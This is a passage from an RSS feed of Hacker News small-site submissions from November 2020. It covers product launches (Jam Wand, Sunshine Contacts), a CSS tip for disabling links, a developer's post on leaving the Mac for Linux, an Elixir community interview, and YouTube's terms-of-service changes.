<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study">https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study</a></em></p>]]>
            </description>
            <link>https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147734</guid>
            <pubDate>Thu, 19 Nov 2020 09:29:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Live-streaming BTC futures prices from 4 exchanges]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25147593">thread link</a>) | @hcarlens
<br/>
November 19, 2020 | https://coinlobster.com/combined.html | <a href="https://web.archive.org/web/*/https://coinlobster.com/combined.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <h5>Subscribe For Updates</h5>
                <p>More features and exchanges coming soon.</p>

                

            </div></div>]]>
            </description>
            <link>https://coinlobster.com/combined.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147593</guid>
            <pubDate>Thu, 19 Nov 2020 09:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jam Wand: A no-code tool to change your website copy, right from your website]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25147320">thread link</a>) | @thedg
<br/>
November 19, 2020 | https://words.jam.dev/introducing-jam-wand/ | <a href="https://web.archive.org/web/*/https://words.jam.dev/introducing-jam-wand/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Today we are excited to launch the beta for Jam Wand -- with it, you can click on any text in your live website, edit it, and submit the change to GitHub to be merged into the code. It just launched in beta today, and you can sign up at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/SXjlHrFlWNQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Jam Wand is the tool <a href="https://twitter.com/_irtefa">Irtefa</a> and I wished we had when we were product managers at Cloudflare. We used to spend too much engineering time changing copy. We felt bad asking engineers for yet another copy change, and engineers felt bad because checking out yet another copy-fixes branch is time consuming and boring. It was a lose-lose.</p><p>We wished changing copy on a website was as easy as changing copy in a Google Doc. That was the goal for building Jam Wand.</p><p>With Jam Wand, any non-technical member of the team - without dealing with code or git - can make copy changes to their live website. It opens up pull requests to the codebase, so all engineers have to do is review and merge, and the copy change is live. </p><p>We know itâ€™s cheesy, but we used to be PMs, we love building products and our dream is to help product teams work better together and build better products, faster. </p><p>We think collaborative teams where everyone can contribute what they do best -- where customer support can update in-product help text, marketing can update landing page copy, dev rel can update developer docs, sales can update CTA text, and so on, leads to better products - which makes teams happy, users happy, it is a win-win.</p><h2 id="how-jam-wand-has-changed-our-workflow"><strong>How Jam Wand has changed our workflow</strong></h2><p>We built the Jam Wand website using Jam Wand (I know, you are very surprised). But it actually changed our workflow -- we didnâ€™t have to have copy ready for engineering before they built the site. Instead, an engineer created the website scaffold with some placeholder text, and then deployed it, and once it was live, I could go in and write in the copy, right from the live website.</p><h2 id="a-new-way-to-build-and-maintain-documentation"><strong>A new way to build and maintain documentation</strong></h2><p>What we experienced at Cloudflare and what Jam users tell us, is that while all website copy is a challenge to update, developer documentation sites are a special challenge.</p><p>Itâ€™s too hard to suggest a fix to documentation (just explaining where the change should be in the docs site takes effort), and then to make the change, it has to be Jira-ed and scheduled into an engineering sprint. And so, many changes to docs that would improve the developer experience often arenâ€™t made because there is too much overhead.</p><p>Jam transforms your developer documentation site into a collaborative workspace, like a Google Doc. And now, with Jam Wand, you can even change the copy right from the page, making it so that anyone can help improve your developer documentation. Weâ€™re excited for what that means for docs especially.</p><h2 id="can-t-wait-to-hear-what-you-think"><strong>Canâ€™t wait to hear what you think</strong></h2><p>You can sign up for the beta at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><p>Thereâ€™s a queue, but we want to prioritize bringing in people who care about collaboration and no-code workflows, who can help us shape the future of the product. Youâ€™ve read all the way to the end here, so itâ€™s likely thatâ€™s you ğŸ˜ -- DM us <a href="https://twitter.com/scoopsofjam">@scoopsofjam</a> your waitlist # and we will try to bring you in early!</p><p>And lastly - Jam Wand was built by <a href="https://twitter.com/_cichocinski">Tomasz CichociÅ„ski</a>, and designed by <a href="http://gloriayanli.com/">Gloria Li</a>. Just wanted to give them a little shout here ğŸ¤© &nbsp;go Tomasz and Gloria!<br></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://words.jam.dev/introducing-jam-wand/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147320</guid>
            <pubDate>Thu, 19 Nov 2020 08:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Disable Links with Only CSS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25147185">thread link</a>) | @emilmoe
<br/>
November 18, 2020 | https://blog.cloudmonitor.dk/how-to-disable-links-with-only-css | <a href="https://web.archive.org/web/*/https://blog.cloudmonitor.dk/how-to-disable-links-with-only-css">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605736637172/NJcXTDUTF.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>Agreed, this is a bit of a hack.</p>
<p>To keep things streamlined with WordPress, I had to implement this hack the other day, where I wanted to disable tag links on just 1 page.</p>
<p>Instead of fiddling with a new plugin, I found it easier, in this case, to disable the link in the template engine with pure CSS.</p>
<p>The magic to remove the link feature lies in <code>pointer-events</code> while the rest ensures it doesn't look like one.</p>
<pre><code><span>a</span><span>.disabled</span> {
  <span>pointer-events</span>: none;      
  <span>text-decoration</span>: none;
  <span>cursor</span>: default;  
  <span>text-decoration</span>: none;
}
</code></pre>
<p>The semantics might be up for discussion, but the performance is possibly better than using Javascript.</p>
<p>This approach is available to all major browsers:  <a target="_blank" href="https://caniuse.com/pointer-events">CSS pointer-events (for HTML)</a> </p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.cloudmonitor.dk/how-to-disable-links-with-only-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147185</guid>
            <pubDate>Thu, 19 Nov 2020 07:53:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introducing Sunshine]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25147134">thread link</a>) | @rxever
<br/>
November 18, 2020 | https://sunshine.com/introducing-sunshine/ | <a href="https://web.archive.org/web/*/https://sunshine.com/introducing-sunshine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="838105f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>How do you make the mundane magical?&nbsp; Imagine if your contacts magically stayed up-to-date with no effort on your part.&nbsp; Or if the great photos you have of your friends got sent to them automatically. What if you never forgot another birthday?</p>

<p>The impossible is now possible. Smartphones have connected the world and put the entire internet into our pockets. We can get whatever we want delivered to our home whenever we want, sometimes by flying drone. With the rise of artificial intelligence, dreams of virtual assistants, self-driving cars and global facial recognition are no longer that far-fetched. However, despite transformational advances in technology, there are still tons of mundane, time-consuming tasks that we all do (or just donâ€™t do) daily.<br><span><br><b>Sunshineâ€™s technology will make the mundane effortless, free up your time, and make it easier to be thoughtful.</b></span></p>
<p><span>Every day, we muddle through tasks with technology that is â€œgood enoughâ€ â€“ contacting friends with stale information that may or may not reach them; searching through email for phone numbers and addresses that we know we have somewhere; manually and painstakingly creating group distribution lists for every occasion; scheduling time to get together with friends using a hodge-podge of calendar, email, and text; pinching and zooming through photos to find one with everyoneâ€™s eyes open. Weâ€™re used to the mess, and weâ€™ve come to accept the friction.&nbsp;</span></p>

<p>No more.&nbsp; Everyday things should <b>just work</b>, and thatâ€™s Sunshineâ€™s mission. Weâ€™re creating technology to address practical, everyday pain points in the basic, foundational tools that connect us with the people we care about. Ultimately, Sunshine will remove complexity in things like contact management, scheduling, event organization, and group communication so you can spend time more meaningfully.</p>

<p>We want to put the focus back on people, and let technology advance in its sophistication and fade into the background.</p>

<p>Today, weâ€™re launching Sunshine Contacts (see our announcement here). Leveraging the power of artificial intelligence, Sunshine Contacts finds, deduplicates, and organizes your contacts. Using a variety of sources, we ensure your contact list is in one place, organized, always complete, and up-to-date.&nbsp; Sunshine Contacts makes your contacts <b>just work</b>.</p>

<p>Sunshine Contacts is our foundation. When your contacts are organized and truly work, they create a flywheel where scheduling, planning, organizing, and being thoughtful about your relationships becomes infinitely easier. When your contacts are complete, comprehensive, and accurately reflect relationships, you can spend your time building meaningful connections and shared experiences. Our future suite of products will make it effortless to keep in touch with the people in your life on a personal and professional level in a thoughtful way.</p>

<p>This is just the beginning.&nbsp; Sunshine is building a suite of services to solve the common pain points that modern technology hasnâ€™t addressed.</p>

<p>At Sunshine, we strive to make the mundane magical. Our vision is to support your day-to-day life â€“ to eliminate time spent on â€œtechnologyâ€ and simply make things better.&nbsp; Easier.&nbsp; If this means you save some â€œscreen timeâ€ and give more thought to the most important people in your life, then weâ€™ll know weâ€™ve done it right.</p>

<p>We canâ€™t wait to show you whatâ€™s next.</p>

<p><i>â€“ Marissa and Enrique</i></p>
</div>
				</div>
				</div></div>]]>
            </description>
            <link>https://sunshine.com/introducing-sunshine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147134</guid>
            <pubDate>Thu, 19 Nov 2020 07:43:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Mac is losing me]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 72 (<a href="https://news.ycombinator.com/item?id=25146808">thread link</a>) | @lawik
<br/>
November 18, 2020 | https://underjord.io/the-mac-is-losing-me.html | <a href="https://web.archive.org/web/*/https://underjord.io/the-mac-is-losing-me.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-11-18</small>
        <p>Iâ€™ve been mostly happy using a Mac since I got myself my first computer earned with programmer money. I believe it was a mid 2009 15" MacBook Pro. That was a computer I used at least until 2016 which I consider very decent usable life. At that point I had replaced the hard-drive with an SSD, upgraded the RAM and switched a battery that was worn out. I stopped using it when it just straight died some time in 2016.</p>
<h2 id="my-history-with-the-mac">My history with the Mac</h2>
<p>So what was that computer to me? It was an extremely well-built and solid-feeling piece of aluminium. A cool keyboard backlight. The magsafe charger and a bunch of USB ports. The keyboard and touchpad were best in class. The build quality was better than any laptop I had owned before. Partly because I had only bought the cheap ones before but also because they really were a step above at the time.</p>
<p>I got it primarily on recommendation from a friendly hacker whoâ€™s recommendations had never lead me wrong before. He spoke well of the underlying UNIX and the experience of using it. Fast, clean and visually pleasing. I think he mostly really liked the backlit keyboard, very hackerly. His recommendation held true, this computer was very good to me.</p>
<p>Iâ€™ve also been the admin on an Xserve server. That was wild. Neat UIs but buggy and finicky as all hell.</p>
<p>Since then Iâ€™ve used the second generation Macbook Air (I believe 2nd, first wedge version) at 11". That was a cool little machine and did what it did very nicely.</p>
<p>Hardware aside, MacOS in itâ€™s earlier incarnations on these computers was always a snappy and competent experience. A polished surface which did a bunch of stuff under the hood that generally made it work better than the different Ubuntu desktop environments and various Windows versions Iâ€™ve had before. Things like Wifi and even Bluetooth felt good in a way they never had before.</p>
<p>A lot of it was the visual polish and the extremely snappy UI. But in total the experience was just great. Spotlight was glorious. I think my first upgrade was Snow Leopard which was generally a very good update as it focused on performance and stability.</p>
<p>As a developerâ€™s machine it was fast enough, competent enough, got out of the way and the UNIX underpinnings meant I didnâ€™t miss Linux at all. Iâ€™ve never been able to really connect with the equivalent powershell stuff in Windows. I guess I just like UNIX.</p>
<p>The only bad thing I can say about my early years of MacBook Pro usage was that the trackpad and the Magic Trackpad I got eventually are probably some of the biggest culprits in some of the RSI-style hand pain Iâ€™ve been dealing with. Trackpads are just murder on my hands and I worked loads off of that setup for a number of years. Took a while before I realized that it was trackpad-related.</p>
<p>Beyond that Iâ€™ve had some refurb Macs for my wife and assorted family, some 13" MBP for work at one point and then a 15" butterfly touchbar MBP for work. I think that was when I started to feel that Apple was diverging from my preferences in the MBP line.</p>
<h2 id="my-current-experience">My current experience</h2>
<p>Thatâ€™s the same computer I have and work on now and it is.. fine? Maybe just OK. Not great. Iâ€™ve had some keys getting stuck but fixable with canned air. I donâ€™t like the touchbar, it has been between useless and an actual hindrance. The TouchID power button is good though. I donâ€™t like living in dongle-town though I mostly like USB C in the long run.</p>
<p>The reason it has been mostly fine for me is that I keep it on tray mounted on a VESA arm, dangling dongles like a technical octopus and I use external peripherals for input.</p>
<p>It gets really hot and loud and then it performs incredibly poorly. So I guess this is one of the throttliest generations. I think I had the â€œdonâ€™t charge it on the wrong sideâ€ problem as well. Some of the CPU shenanigans have calmed down as I installed the Turbo Boost Switcher tool to just disable the Turbo Boost, removing performance for peace and quiet.</p>
<p>As Iâ€™ve been using these devices it has become increasingly annoying to figure out how to install â€œunknownâ€ apps. I need some non-discoverable terminal incantation to get the option to accept installing things that are unsigned. Thereâ€™s always a new piece getting locked down. And while I think thatâ€™s often to the benefit of the average consumer, Iâ€™m not that. And I just get more annoyed.</p>
<p>Iâ€™ve been frustrated about the uninspiring performance delivered for the incredible brand markup that Apple charges. I donâ€™t mind the computer being expensive if the experience is good and the hardware reasonable. The experience feels like it is slipping, especially for my needs and the hardware has just been getting less impressive to me.</p>
<h2 id="the-hardware">The hardware</h2>
<p>My gaming computer has a Ryzen. For a while I did my dev on that as we had just moved to our house and the office wasnâ€™t finalized. Woof, aside from running Windows as a dev environment which I didnâ€™t enjoy there was some serious upside on that machine.</p>
<p>On the Mac my options are very limited. I canâ€™t get a Ryzen, I canâ€™t get anything modern with Intel or meaningfully upgradable at all. The Mac Pro doesnâ€™t count. It comes underspeced at hilarious prices. I like some of the design decisions but the price-point doesnâ€™t make any kind of sense for me and what I do. I canâ€™t buy an interesting Mac from a performance standpoint.</p>
<p>Or can I? Well, they just announced the M1 chip and ARM Macs are now a fact. I think I might get one at some point. For a travel laptop I donâ€™t think the rest of the industry is ready to fight Apple. Battery life and good bang for buck power might actually keep a Mac in my life for that. But I feel like the general trend is away from what I want. Or I might just use my iPad Pro for that use-case.</p>
<p>I think the M1 will be quite impressive when the benchmarks roll in. Iâ€™m sure it will suit many people for real-world use-cases as well. However, from the first presentation on it and the first batch of Macs I donâ€™t feel like the direction is for me. IO was heavily sacrificed. Upgradability is pretty much out the window. These things can be fine for a travel device for me where battery and weight are primary concerns. In that regard the new Air looks pretty good.</p>
<h2 id="the-software">The software</h2>
<p>Beyond that the coming OS, Big Sur, is taking MacOS in a direction I dislike. Catalina was quite messy and felt like it took steps toward walling off the Mac. Big Sur seems even more heavy-handed in that area and finally the M1 can push that even further if Apple feels like it. My trust is eroding on letting Apple set the tone for my computing life.</p>
<p>Donâ€™t get me wrong, I think their approach to this transition is incredibly neat with Rosetta2 and how they are using the bytecode stuff with the App Store and whatnot. And the possibility to run iOS and iPad apps natively could be very useful. But none of this really moves the needle for me.</p>
<h2 id="so-whats-next">So whatâ€™s next?</h2>
<p>With my office in the garage as my primary work location Iâ€™m looking to transition to a desktop computer with lots of power. It will run Linux. Marking my first major return to desktop linux as a daily driver in a bundle of years. And it will run as light a desktop environment as I can stomach. I just wanted a stupid amount of performance to offset som of the UX niceties I know I will miss or have to customize  on my own.</p>
<p>Iâ€™m excited about exercising my development tools on a strong modern CPU rather than the throttled mess my current laptop offers. But Iâ€™m not thrilled about this move beyond the hardware aspect. I liked MacOS but I just donâ€™t feel like Apple gives much of a care for the things I care about. And I feel like the software side on the Mac is slipping, consistently.</p>
<p>If they released an expandable Mac that wasnâ€™t ridiculously expensive they would really make me think twice. But that feels unlikely.</p>
<p>So Iâ€™ll build myself a monstrous machine that can compensate in raw power for the potential lack of elegance and which offers unbounded flexibility rather than a poorly tended garden that someone keeps trying to wall in.</p>
<p>Iâ€™m not happy about it. Iâ€™ve generally enjoyed using my Macs. But when someone says â€œweâ€™ll give you the full experienceâ€, settling into that requires trust. And my trust that Apple and me are in alignment keeps fading.</p>
<p>Also, Iâ€™m developing a lot with heavily concurrent workloads. So I really look forward to exercising more cores. 2021, year of the Linux desktop (for me).</p>
<p>If you have thoughts, comments or a hell yeah you want to share about this topic or maybe you want me to cover some specific part of my transition here, let me know either via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on Twitter <a href="https://twitter.com/lawik">@lawik</a>. My first thoughts and my build might just show up first on my newsletter, so consider signing up for that below. It donâ€™t track. Thanks for reading.</p>

    </article></div>]]>
            </description>
            <link>https://underjord.io/the-mac-is-losing-me.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146808</guid>
            <pubDate>Thu, 19 Nov 2020 06:29:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elixir Community Voices: Lars Wikman]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25146798">thread link</a>) | @lawik
<br/>
November 18, 2020 | https://preslav.me/2020/11/19/elixir-community-voices-lars-wikman/ | <a href="https://web.archive.org/web/*/https://preslav.me/2020/11/19/elixir-community-voices-lars-wikman/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div id="post-body"><p>To say that Lars (a.k.a <a href="https://twitter.com/lawik">@lawik</a>) is only, as he describes himself, an â€œElixir consultant with too much enthusiasmâ€ will be an understatement. The guy is all over the place, writing software, helping businesses move forward, writing <a href="https://underjord.io/the-beam-marches-forward.html">inspiring stories</a> about the future of the BEAM, and co-hosting <a href="https://devchat.tv/podcasts/elixir-mix/">an Elixir podcast.</a> That is how I first got to know Lars. </p><p>Based in Sweden, Lars started his programming journey by building websites with Notepad, then learning PHP and eventually taking his hobby pro through contract work, a failed startup, a couple of product teams and onward into independent consulting. He lives along the west coast of Sweden - a little way out of the city, where he attempts to grow vegetables with his wife and baby. The baby is terrible at growing vegetables.</p><p>In 2016 Lars discovered Erlang/Elixir, and this changed his view on developing software.</p><h2 id="what-brought-you-to-elixir">What brought you to Elixir?</h2><p><strong>Lars:</strong> At first, it was a bit of hype. I had a colleague who was quite a good talker and he went on at length about the legendary resilience of Erlang and hot updates for buried telephone switches. He spoke very well of Ecto changesets and was generally, very positive about Elixir. I ended up looking at talks about Phoenix. This was when <a href="https://hexdocs.pm/phoenix/channels.html">Channels</a> was the new hotness and just before <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> took the keynote stage. Looking at what the community was putting out made me give Elixir a try. When I went into business for myself, I was expecting to do a lot of Python, but I intended to try and get into Elixir.</p><p>I enjoy toying around with Raspberry Pi, so it was just a matter of time before I started playing with <a href="https://www.nerves-project.org/">Nerves</a>. I wanted to use the <a href="https://shop.pimoroni.com/products/inky-what?variant=21214020436051">Inky eInk</a> display with Nerves but the library was only available for Python. So, I decided to make a pure Elixir reimplementation. It proved to be a rabbit hole, but the Nerves community was very welcoming and helpful, and I was sold on Elixir for good. Love that crew!</p><p>I feel like Iâ€™ve written <a href="https://underjord.io/why-am-i-interested-in-elixir.html">at</a> <a href="https://underjord.io/why-am-i-still-excited-about-elixir.html">least</a> <a href="https://underjord.io/more-than-one-thing-at-a-time.html">four</a> <a href="https://underjord.io/the-beam-marches-forward.html">blog posts</a> about why I remain interested in and excited by Elixir and the BEAM. I like Python. I understand why people like Node.js but I canâ€™t quite get excited about it. Either you go higher level on top of good abstractions, as the BEAM has, or you go lower level for unconstrained performance and flexibility.</p><h2 id="elixir-and-erlang-differ-significantly-from-other-mainstream-programming-languages-what-did-you-find-most-challenging-when-starting-with-the-stack">Elixir and Erlang differ significantly from other mainstream programming languages. What did you find most challenging when starting with the stack?</h2><p><strong>Lars:</strong> Immutability and the functional programming paradigm. Much of my early code did nothing or only did things by accident because I expected that the Map functions would mutate the map, not return a new one. Grasping map, reduce and all of their derivatives in the Enum module took me a bit. It was an adaptation process.</p><p>I guess it has also taken a while to disentangle <em>use</em>, <em>require</em>, <em>import</em> and <em>alias</em>. I still wouldnâ€™t take bets on my understanding of <em>require</em> ;)</p><p>Iâ€™ve found the community incredibly welcoming at every step. Iâ€™ll call out <a href="https://twitter.com/nyaray">Emilio Nyaray</a> for helping me with some major refactoring and absorbing idiomatic Elixir. I hope everyone has such a good reception and it feels like the general feel of the community is very positive.</p><h2 id="tell-us-a-bit-about-your-most-recent-project-why-did-you-choose-elixir-for-it">Tell us a bit about your most recent project. Why did you choose Elixir for it?</h2><p><strong>Lars:</strong> A little while ago I made <a href="https://underjord.io/live-server-push-without-js.html">a very silly thing</a>. It is a way to show live information on a web page without using Javascript. Instead, it uses the <a href="https://en.wikipedia.org/wiki/Motion_JPEG">MJPEG</a> video protocol to deliver a new frame whenever the state changes. I used it to implement a live counter.</p><p>I used Plug and some code I found that the Nerves people had put together. The state is managed by a GenServer which keeps track of the connections as they come in, asking for the â€imageâ€. It would add them to the list, render a new frame with some text on it, and send it to everyone connected. &nbsp;That would have been incredibly finicky in most runtimes. In my case, the biggest challenge was hitting the front page of Hacker News, where my Nginx config became a bottleneck for concurrent connections. I might have also needed to tweak my Plug a bit. It all maxed out at 450 or so concurrent connections, and I think it should be able to do way more.</p><p>I am about to add some upgrades to the <a href="https://beambloggers.com/">Beambloggers Webring</a> soon that follow the same vein. I donâ€™t like running a database if I donâ€™t need one. So the MJPEG thing is just in-memory data and a temporary state. I restart it, the connections are gone, and start building up again. Similarly, I want Beambloggers to bring in some fresh information about the different blogs. So Iâ€™ll have it run a GenServer that pulls in RSS feeds and parses out some recent items that I can link to. In-memory, background work.</p><p>Such use cases are something Iâ€™d hesitate to do in Python, for example. If I build something stateful in Python, I feel like it is bound to leak somewhere. Elixir and Erlang have abstractions that allow me to do such things with confidence.</p><h2 id="you-also-do-elixir-consulting-what-kinds-of-applications-do-your-clients-choose-the-beam-for-as-opposed-to-other-tech-stacks"><br>You also do Elixir consulting. What kinds of applications do your clients choose the BEAM for, as opposed to other tech stacks?</h2><p><strong>Lars: </strong>Distributed applications that run indefinitely. Those line up with the absolute majority of work Iâ€™ve ever done. Servers, services, and web applications. If I were building large amounts of CLI tooling, I wouldnâ€™t pick it. If I needed native desktop bindings, I wouldnâ€™t pick it. But generally, Iâ€™m in the web application world.</p><p>As the cultural successor to Ruby on Rails, I am seeing Phoenix being used all over the place and quite popular with startups. I have seen a lot of companies picking up Elixir without necessarily knowing much about OTP. I think this is fine, and mostly speaks to the maturity of Phoenix and Ecto that people donâ€™t need to.</p><h2 id="in-the-era-of-kubernetes-and-microservices-where-do-you-see-monolithic-beam-applications-fit-into-the-picture">In the era of Kubernetes and Microservices, where do you see monolithic BEAM applications fit into the picture?</h2><p><strong>Lars:</strong> It is interesting. The way Erlang structures things in multiple <em>applications</em> on a <em>node</em> as part of a <em>cluster</em> brings in some infrastructure concerns. I think some people worry that this unconventional approach is a problem when working in a polyglot environment, for example. I donâ€™t think so. Lots of people put the BEAM in their containers and ship it out to the Kubernetes cluster in the same way as every other stack. Microservices tend to be about the contracts you expose, not the internals of how the application runs. Therefore, the fact you run a BEAM application or even a cluster of BEAM applications as one service is perfectly fine.</p><p>Where I believe much of the power of BEAM is though, is if you donâ€™t rely on microservices and a polyglot-heavy environment. You might then be able to cut off a lot of dead weight. Or at least, manage the complexity using tools you know, rather than write YAML until it goes away. Some of the tools are there by design; others are perhaps, what we should be building in the future. Iâ€™ve gotten into it to some extent in my blog post <a href="https://underjord.io/the-beam-marches-forward.html"><em>The BEAM marches forward.</em></a></p><p><br>For an in-between path, I would take a look at <a href="https://www.nomadproject.io/">Nomad</a> which seems to be a slightly lighter Kubernetes competitor that can run things without containers. I think it suits the BEAM very well, as Elixir releases handle many of the perks of containerization. I havenâ€™t tried it but if you do, let me know. I am curious about how Nomad differs from Kubernetes.</p><h2 id="as-someone-listening-to-podcasts-for-over-15-years-i-can-t-help-but-ask-how-does-one-get-the-courage-to-host-a-podcast">As someone listening to podcasts for over 15 years, I canâ€™t help but ask. How does one get the courage to host a podcast?</h2><p><strong>Lars:</strong> I donâ€™t think Iâ€™m particularly brave. You should see how uncomfortable I am on ladders.</p><p>I think I picked up a habit of pressing through discomfort partly in my teens and partly running a startup with a mentor of mine. When I was around 14, my dad passed away, essentially a heart attack out of the blue. That experience totally shifted my threshold for pain or discomfort and deeply changed how I approached life. That change in attitude was probably part of why I was keen to do the startup. And the startup led to everything else. Turns out that running a business when I barely knew what I was doing as a technical lead was a constant exercise in being okay with discomfort.</p><p>I donâ€™t recommend overworking. I donâ€™t recommend burning yourself out on a startup. Yet, the discomfort is part of the learning sometimes. If you spend a lot of time outside your comfort zone, you are likely to learn more. Being aware that you are choosing discomfort and staying with it is powerful.</p><p>Oh, a podcast? Well, you get asked on as a guest and enjoy it. And then, when the OG host goes off to start a new one, you get contacted as one of the potential new hosts. And since you try not to worry too much and are willing to tackle discomfort, you fret about it for a bit, ask too many questions, and then give it a shot.</p><p><strong>Lars:</strong> It might feel daunting at first. Donâ€™t feel pressure to understand the BEAM, Erlang, OTP, and all of that good stuff right away. If you are an inexperienced developer, any language can seem imposing. We all end up being beginners when we move over to a new ecosystem. I think we will all be happier if we concede that we will not master everything and will only learn a portion of it. What one should focus on instead is building software well.</p></div>
    </div></div>]]>
            </description>
            <link>https://preslav.me/2020/11/19/elixir-community-voices-lars-wikman/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146798</guid>
            <pubDate>Thu, 19 Nov 2020 06:27:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ads may now appear on any YouTube video]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25146542">thread link</a>) | @radley
<br/>
November 18, 2020 | https://blog.youtube/news-and-events/updates-to-youtubes-terms-of-service | <a href="https://web.archive.org/web/*/https://blog.youtube/news-and-events/updates-to-youtubes-terms-of-service">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-component="yt-paragraph-media" data-media-type="paragraph">
  <div>
    
    <div>
      <div>
        <div><p>We periodically update our Terms of Service to make sure they are clear, easy to understand and meet the needs of our partners, advertisers and viewers. Starting today, weâ€™re rolling out an updated Terms of Service in the United States. These new terms will be effective in countries outside of the United States in mid-year 2021. Please read through the <a href="https://www.youtube.com/t/terms">updated terms</a> carefully, they include the following changes.</p><p>First, our Terms of Service already expressly state that you are not allowed to â€œcollect or harvest any information that might identify a person (for example, usernames), unless permitted by that person.â€ This has always included facial recognition data, and with todayâ€™s updated Terms of Service, we are making that explicitly clear.</p><p>Second, ads can now appear on videos from channels not in the YouTube Partner Program (YPP), and we will begin gradually placing ads on brand safe videos. This is part of our ongoing investments in new solutions, like Home Feed ads, that help advertisers responsibly tap into the full scale of YouTube to connect with their audiences and grow their businesses. Advertisers will continue to have full access to our brand suitability controls. Over the past three years, we improved our ability to identify appropriate placements for advertisers, in part by working closely with our advertising partners and <a href="https://wfanet.org/knowledge/item/2020/09/23/WFA-and-platforms-make-major-progress-to-address-harmful-content">industry organizations</a>. Because these channels are not in YPP, there is no creator revenue share, but creators can still apply to YPP once they hit the <a href="https://support.google.com/youtube/answer/72851?hl=en">eligibility criteria</a>, which remains the same.</p><p>Finally, for U.S. creators in YPP, our updated Terms state that any revenue payments from YouTube will now be treated as royalties from a U.S. tax perspective, and that Google will withhold taxes from these payments if it is required by law. U.S. creators will generally be unaffected by these withholding taxes as long as they provide valid tax documentation in <a href="https://support.google.com/adsense/answer/2490070?hl=en">Adsense</a>. For creators outside of the U.S., we will provide more details in 2021 as the terms become available in their countries.</p><p>You can view the previous Terms of Service and how it compares with this update in our <a href="https://yt.be/help/ToS20">help forum</a>.</p></div>
      </div>
      
    </div>
  </div>
</section></div>]]>
            </description>
            <link>https://blog.youtube/news-and-events/updates-to-youtubes-terms-of-service</link>
            <guid isPermaLink="false">hacker-news-small-sites-25146542</guid>
            <pubDate>Thu, 19 Nov 2020 05:31:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Realistic Reddit AI That Gets Upvoted]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25146048">thread link</a>) | @optimalsolver
<br/>
November 18, 2020 | https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/ | <a href="https://web.archive.org/web/*/https://paulvanderlaken.com/2020/02/10/python-generate-realistic-reddit-ai-upvoted/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<div id="primary">
		<main id="main" role="main">

		
			
<article id="post-8640">
